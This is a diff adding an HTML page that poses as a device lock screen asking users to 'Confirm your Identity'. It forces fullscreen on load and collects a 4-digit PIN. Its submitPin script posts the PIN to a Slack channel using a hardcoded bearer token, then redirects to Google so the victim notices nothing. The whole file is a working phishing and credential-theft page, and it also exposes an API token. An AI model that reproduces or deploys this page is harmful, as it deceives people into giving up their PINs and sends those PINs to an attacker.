@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your Identity</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://i.pinimg.com/236x/a2/b3/ce/a2b3ceea1db6480108f04be1d5ef6f61.jpg') no-repeat center center/cover;
+            font-family: Arial, sans-serif;
+            color: white;
+            margin: 0;
+            overflow: hidden;
+        }
+        .lock-screen {
+            text-align: center;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        p {
+            font-size: 14px;
+            margin-top: 0;
+        }
+        .pin-display {
+            font-size: 32px;
+            letter-spacing: 10px;
+            background: transparent;
+            border: none;
+            color: white;
+            text-align: center;
+            width: 120px;
+        }
+        .num-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .num-pad button {
+            width: 70px;
+            height: 70px;
+            font-size: 24px;
+            border-radius: 50%;
+            border: none;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            cursor: pointer;
+        }
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        .bottom-buttons button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            font-size: 18px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body onload="openFullscreen()">
+    <div class="lock-screen">
+        <h2>Enter PIN</h2>
+        <p>Your PIN contains at least 4 digits.</p>
+        <input type="password" id="pin" class="pin-display" maxlength="4" readonly>
+        <div class="num-pad">
+            <button onclick="enterDigit(1)">1</button>
+            <button onclick="enterDigit(2)">2</button>
+            <button onclick="enterDigit(3)">3</button>
+            <button onclick="enterDigit(4)">4</button>
+            <button onclick="enterDigit(5)">5</button>
+            <button onclick="enterDigit(6)">6</button>
+            <button onclick="enterDigit(7)">7</button>
+            <button onclick="enterDigit(8)">8</button>
+            <button onclick="enterDigit(9)">9</button>
+            <button onclick="clearPin()">&#x232B;</button>
+            <button onclick="enterDigit(0)">0</button>
+            <button onclick="submitPin()">OK</button>
+        </div>
+        <div class="bottom-buttons">
+            <button onclick="alert('Emergency call')">Emergency call</button>
+        </div>
+    </div>
+    <script>
+        function openFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+        function enterDigit(digit) {
+            let pinInput = document.getElementById('pin');
+            if (pinInput.value.length < 4) {
+                pinInput.value += digit;
+            }
+        }
+        function clearPin() {
+            document.getElementById('pin').value = '';
+        }
+        function submitPin() {
+            let pin = document.getElementById('pin').value;
+            if (pin.length === 4) {
+                fetch('https://slack.com/api/chat.postMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer xoxe.xoxp-1-Mi0yLTg2ODYwOTg4NDU5MzctODY4NjA5ODg2NDU2MS04NjY4OTkzMjc1MTEwLTg2Njg5OTMzMDIxODItYzZjMjdjM2UwYjg2N2I1YThiY2JhYjdmMDdkYTllMDFjZTA3NGU2MDc1ODkzZWM5OTM4ODdlMjlmMDA0Yjc1Yg'
+                    },
+                    body: JSON.stringify({
+                        channel: 'C08KNQVQDEJ',
+                        text: 'Entered PIN: ' + pin
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Success:', data);
+                        window.location.href = 'https://www.google.com';
+                    } else {
+                        console.error('Slack API Error:', data);
+                        alert('Failed to send PIN to Slack. Check console for details.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Network error or invalid Slack credentials.');
+                });
+            } else {
+                alert('Enter a 4-digit PIN');
+            }
+        }
+    </script>
+</body>
+</html>
